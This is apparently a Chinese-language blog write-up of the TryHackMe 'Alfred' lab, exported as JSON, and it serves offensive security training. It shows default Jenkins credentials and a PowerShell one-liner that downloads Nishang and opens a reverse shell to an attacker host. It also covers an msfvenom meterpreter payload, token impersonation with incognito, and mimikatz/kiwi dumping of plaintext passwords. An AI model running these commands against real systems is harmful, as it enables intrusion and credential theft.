{"title":"Alfred CTF - TryHackMe.com","uid":"9bc1ecabb820de0d2d4c4b58e6a30fdc","slug":"Alfred","date":"2022-03-21T13:36:36.816Z","updated":"2022-03-25T18:28:19.739Z","comments":true,"path":"api/articles/Alfred.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/index.png","content":"<p>在Alfred靶机上，我们利用Jenkins常见的错误配置信息，进行攻击提权。</p>\n<h1 id=\"获取信息\"><a href=\"#获取信息\" class=\"headerlink\" title=\"获取信息\"></a>获取信息</h1><p>开启靶机，获取靶机IP。我们直接使用nmap进行扫描，确认服务端口。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/nmap_port.png\" alt=\"nmap 扫描服务\"><br>扫描结果中的两个端口均为web服务(<code>80,8080</code>),从浏览器打开进行查看。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/nmap_80.png\" alt=\"nmap 80\"><br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/nmap_8080.png\" alt=\"nmap 8080\"><br>我们的攻击重点就在Jenkins服务上，Jenkins默认初始化会存在admin用户。在暴力破解密码前，我们可以尝试密码猜测，当输入<code>admin:admin</code>时，直接登录成功。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/jenkins_index.png\" alt=\"jenkins 主界面\"><br>点击项目<code>project</code>，选择<code>configure</code>选项编辑项目，可以利用Bulid步骤下的<code>Execute Windows batch command</code>组件在靶机上执行脚本命令。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/project_build.png\" alt=\"project build\"><br>我们需要将下载好的<a href=\"https://github.com/samratashok/nishang/tree/master/Shells\">Invoke-PowerShellTcp.ps1</a>托管在Http服务上，同时开启Ncat监听。并将下面的代码要放在Jenkins中执行，获取反shell会话。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">powershell iex (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;&lt;yourwebserver&gt;&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/jenkins_command.png\" alt=\"jenkins command\"><br>执行成功后，获得反Shell会话。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/reverse_shell.png\" alt=\"reverse shell\"></p>\n<div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">Nishang</p>\n<p>Nishang 是一个框架和脚本和有效负载的集合，它支持使用 PowerShell 进行攻击性安全、渗透测试和红队。Nishang 在渗透测试的所有阶段都很有用。</p>\n</div>\n<h1 id=\"切换Shell\"><a href=\"#切换Shell\" class=\"headerlink\" title=\"切换Shell\"></a>切换Shell</h1><p>为了提升权限更简单，我们需要将当前获取的shell会话切换到meterprter shell。<br>1.使用<code>msfvenom</code>制作恶意程序,并托管在http服务器上</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -a x86 --encoder x86&#x2F;shikata_ga_nai LHOST&#x3D;[IP] LPORT&#x3D;[PORT] -f exe -o [SHELL NAME].exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li><code>-p</code>: 选择一个payload</li>\n<li><code>-a</code>: 指定系统架构</li>\n<li><code>--encoder</code>: 指定编码器，此处使用的<a href=\"https://www.mandiant.com/resources/shikata-ga-nai-encoder-still-going-strong\">x86&#x2F;shikata_ga_nai</a>编码器</li>\n<li><code>-f</code>: 生成的文件格式</li>\n<li><code>-o</code>: 生成路径和文件名</li>\n</ul>\n<p><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/msfvenom_reverse.png\" alt=\"msfvenom reverse\"></p>\n<p>2.使用jenkins将恶意程序上传至靶机</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt;&#x2F;shell-name.exe&#39;,&#39;shell-name.exe&#39;)&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/jenkins_reverse.png\" alt=\"jenkins upload reverse\"><br>3.运行MetaSploit，开启<code>exploit/multi/handler</code>监听，等待获取meterpreter会话</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">use exploit&#x2F;multi&#x2F;handler set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp set LHOST your-ip set LPORT listening-port run<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/msf_handler.png\" alt=\"msfconsole exploit/multi/handler\"><br>4.在之前获取的会话中运行<code>powershell Start-Process &quot;shell-name.exe&quot;</code><br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/powshell_start_reverse.png\" alt=\"powershell Start-Process\"><br>5.执行完成后，msfconsole获取meterpreter会话。后续的提权操作都会在meterpreter会话中进行。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/meterpreter_shell.png\" alt=\"meterpreter shell\"></p>\n<h1 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h1><p>Windows使用访问令牌(<a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens\">Access Tokens</a>)来确保帐户具有执行特定操作的正确权限。当用户登录或通过身份验证时，帐户令牌会分配给帐户。这通常由<a href=\"https://www.glasswire.com/process/lsass.exe.html\">Local Security Authority Subsystem Service(LSASS.exe)</a>完成。</p>\n<p>访问令牌时描述进程或线程的安全上下文对象。令牌中的信息包括与进程或线程关联的用户帐户的身份和权限。当用户登录时，系统通过将其与存储在安全数据库中的信息进行比较来验证用户的密码，如果密码是经过身份认证的，系统会生成一个访问令牌。代表此用户执行的每个进程都有此访问令牌的副本。</p>\n<p>当线程与安全对象交互或尝试执行需要特权的系统任务时，系统使用访问令牌来识别用户。访问令牌包含以下信息：</p>\n<ul>\n<li>用户帐户的安全标识符(SID)</li>\n<li>用户所属组的 SID</li>\n<li>标识当前登录会话的登录 SID</li>\n<li>用户或用户组拥有的权限列表</li>\n<li>所有者 SID</li>\n<li>主要组的 SID</li>\n<li>当用户在未指定安全描述符的情况下创建安全对象时系统使用的默认DACL</li>\n<li>访问令牌的来源</li>\n<li>令牌是主要令牌还是模拟令牌</li>\n<li>限制 SID的可选列表</li>\n<li>当前模拟级别</li>\n<li>其他统计</li>\n</ul>\n<p>有两种类型的访问令牌：</p>\n<ul>\n<li>主要访问令牌：与登录时生成的用户帐户相关联的令牌，用于描述与该进程关联的用户帐户的安全上下文。</li>\n<li>模拟令牌：允许特定进程(或进程中的线程)使用另一个(用户&#x2F;客户端)进程的令牌访问资源。</li>\n</ul>\n<p>对于模拟令牌，有不同的级别：</p>\n<ul>\n<li>SecurityAnonymous(匿名)：当前用户&#x2F;客户端不能冒充另一个用户&#x2F;客户端</li>\n<li>SecurityIdentification(识别)：当前用户&#x2F;客户端可以获取客户端的身份和权限，但不能冒充客户端</li>\n<li>SecurityImpersonation(模拟)：当前用户&#x2F;客户端可以在本地系统上模拟客户端的安全上下文</li>\n<li>SecurityDelegation(委托)：当前用户&#x2F;客户端可以在远程系统上模拟客户端的安全上下文</li>\n</ul>\n<p>其中安全上下文是包含用户相关安全信息的数据结构。</p>\n<p>帐户的权限允许用户执行特定操作。以下是最常被滥用的特权(具体含义可以参考<a href=\"https://github.com/gtworek/Priv2Admin\">Priv2Admin</a>)：</p>\n<ul>\n<li>SeImpersonatePrivilege</li>\n<li>SeAssignPrimaryPrivilege</li>\n<li>SeTcbPrivilege：</li>\n<li>SeBackupPrivilege</li>\n<li>SeRestorePrivilege</li>\n<li>SeCreateTokenPrivilege</li>\n<li>SeLoadDriverPrivilege</li>\n<li>SeTakeOwnershipPrivilege</li>\n<li>SeDebugPrivilege</li>\n</ul>\n<hr>\n<p>在反shell会话中运行<code>whoami /priv</code>查看当前帐户拥有的权限。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/powshell_whoami.png\" alt=\"powshell whoami /priv\"><br>可以看到当前帐户拥有<code>SeDebugPrivilege、SeChangeNotifyPrivilege、SeImpersonatePrivilege、SeIncreaseWorkingSetPrivilege</code>四个权限，其中的<code>SeDebugPrivilege、SeImpersonatePrivilege</code>可以被MetaSploit的<code>incognito module</code>利用。</p>\n<p>在meterpreter会话中运行<code>load incognito</code>加载模块，加载成功后运行运行<code>list_tokens -g</code>查看可用的令牌。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/list_token_g.png\" alt=\"list_token -g\"><br>在<b>Delegation Tokens Available</b>(可用的委托令牌)列表下，发现了<code>BUILTIN\\Administrators</code>是可用的。使用<code>impersonate_token &quot;BUILTIN\\Administrators&quot;</code>命令模拟管理员令牌。至此，已经取得了管理员权限。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/impersonate_token.png\" alt=\"impersonate token\"><br>由于Windows处理权限的方式，它使用进程的主令牌而不是模拟令牌来确定进程能做什么不能做什么，所以即使获得了管理员的模拟令牌，也可能没有管理员的权限。为了拿到最终的flag，我们需要使用meterpreter的<code>migrate</code>命令将进程迁移到正在运行的进程中(使用<code>ps</code>查看具有管理员权限的进程)。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/meterpreter_migrate.png\" alt=\"meterpreter migrate\"></p>\n<div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">incognito module</p>\n<p><a href=\"https://www.offensive-security.com/metasploit-unleashed/fun-incognito/\">Incognito</a>最初是一个独立的应用程序，允许在成功入侵系统时模拟用户令牌。这被集成到Metasploit并最终集成到Meterpreter。</p>\n\n</div>\n<h1 id=\"后渗透\"><a href=\"#后渗透\" class=\"headerlink\" title=\"后渗透\"></a>后渗透</h1><p>Mimikatz 是一款功能强大的轻量级调试神器，通过它可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从<code>lsass.exe</code>进程中获取当前登录系统用户名的密码。</p>\n<div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">提示</p>\n<p>注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p>\n</div>\n<p>Metasploit6中，<code>mimikatz</code>被替换为<code>kiwi</code>。在meterpreter会话中使用<code>load kiwi</code>加载扩展，成功后执行<code>help kiwi</code>。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/meterpreter_kiwi.png\" alt=\"meterpreter kiwi\"></p>\n<ul>\n<li>creds_all：列举所有凭据</li>\n<li>reds_kerberos：列举所有kerberos凭据</li>\n<li>creds_msv：列举所有msv凭据</li>\n<li>creds_ssp：列举所有ssp凭据</li>\n<li>creds_tspkg：列举所有tspkg凭据</li>\n<li>creds_wdigest：列举所有wdigest凭据</li>\n<li>dcsync：通过DCSync检索用户帐户信息</li>\n<li>dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</li>\n<li>golden_ticket_create：创建Golden Tickets</li>\n<li>kerberos_ticket_list：列举kerberos Tickets</li>\n<li>kerberos_ticket_purge：清除kerberos Tickets</li>\n<li>kerberos_ticket_use：使用kerberos Tickets</li>\n<li>kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</li>\n<li>lsa_dump_sam：dump出lsa的SAM</li>\n<li>lsa_dump_secrets：dump出lsa的密文</li>\n<li>password_change：修改密码</li>\n<li>wifi_list：列出当前用户的wifi配置文件</li>\n<li>wifi_list_shared：列出共享wifi配置文件&#x2F;编码</li>\n</ul>\n<p>使用<code>kiwi_cmd sekurlsa::logonpasswords</code>抓取密码,获得了用户<code>bruce</code>的明文密码。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/kiwi_sekurlsa_logonpasswords.png\" alt=\"kiwi sekurlsa::logonpasswords\"></p>\n<h1 id=\"使用工具\"><a href=\"#使用工具\" class=\"headerlink\" title=\"使用工具\"></a>使用工具</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li>Namp</li>\n<li>MetaSploit</li>\n<li><a href=\"https://www.offensive-security.com/metasploit-unleashed/msfvenom/\">msfvenom</a></li>\n<li><a href=\"https://github.com/samratashok/nishang\">Nishang</a></li>\n<li><a href=\"https://github.com/ParrotSec/mimikatz\">mimikatz</a></li>\n</ul></blockquote>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li><a href=\"https://book.hacktricks.xyz/shells/shells/msfvenom\">MSFVenom - CheatSheet</a></li>\n<li><a href=\"https://www.buaq.net/go-93004.html\">PowerShell for Pentester: Windows Reverse Shell</a></li>\n<li><a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens\">Access Tokens</a></li>\n<li><a href=\"https://www.exploit-db.com/papers/42556\">Abusing Token Privileges For LPE</a></li>\n<li><a href=\"https://www.cnblogs.com/-mo-/p/11890232.html\">Mimikatz使用大全 </a></li>\n</ul></blockquote>\n","text":"在Alfred靶机上，我们利用Jenkins常见的错误配置信息，进行攻击提权。 获取信息开启靶机，获取靶机IP。我们直接使用nmap进行扫描，确认服务端口。扫描结果中的两个端口均为web服务(80,8080),从浏览器打开进行查看。我们的攻击重点就在Jenkins服务上，Jenk...","link":"","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Alfred","slug":"Alfred","count":1,"path":"api/tags/Alfred.json"},{"name":"Nishang","slug":"Nishang","count":1,"path":"api/tags/Nishang.json"},{"name":"Windows Privilege Escalation","slug":"Windows-Privilege-Escalation","count":4,"path":"api/tags/Windows-Privilege-Escalation.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">获取信息</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%88%87%E6%8D%A2Shell\"><span class=\"toc-text\">切换Shell</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87\"><span class=\"toc-text\">权限提升</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%8E%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">后渗透</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">使用工具</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3\"><span class=\"toc-text\">参考文档</span></a></li></ol>","author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"HackPark CTF - TryHackMe.com","uid":"b2262541e68f87fb5672c699c612b8ae","slug":"HackPark","date":"2022-03-28T14:30:27.813Z","updated":"2022-04-01T17:44:54.777Z","comments":true,"path":"api/articles/HackPark.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/image_by_url.jpg","text":"HarkPark使用Hydra爆破登录网站，搜索漏洞，并利用漏洞升级Windows机器！ 信息收集开启tryhackme靶机，使用Nmap进行服务发现扫描。 └─$ sudo nmap 10.10.1.135 -sS -Pn -F --max-retries 0 -T 4 -oA...","link":"","photos":[],"count_time":{"symbolsCount":"24k","symbolsTime":"22 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Windows Privilege Escalation","slug":"Windows-Privilege-Escalation","count":4,"path":"api/tags/Windows-Privilege-Escalation.json"}],"author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"Steel Mountain CTF - TryHackMe.com","uid":"11041d9251423dbeb0d78e2c3336a544","slug":"Steel Mountain CTF","date":"2022-03-17T17:29:47.695Z","updated":"2022-03-21T14:03:02.034Z","comments":true,"path":"api/articles/Steel Mountain CTF.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/index.png","text":" Steel Mountain是TryHackMe的Windows靶机，基于Mr Robot Tv系列。 侦察探测开启TryHackMe靶机后，使用ping命令检测主机是否启动并运行。ping命令执行成功后，使用nmap进行端口扫描。从扫描结果中可以发现，这个靶机运行了SMB服务...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Windows Privilege Escalation","slug":"Windows-Privilege-Escalation","count":4,"path":"api/tags/Windows-Privilege-Escalation.json"},{"name":"Steel Mountain","slug":"Steel-Mountain","count":1,"path":"api/tags/Steel-Mountain.json"},{"name":"PowerSploit","slug":"PowerSploit","count":1,"path":"api/tags/PowerSploit.json"},{"name":"winPEAS","slug":"winPEAS","count":1,"path":"api/tags/winPEAS.json"}],"author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}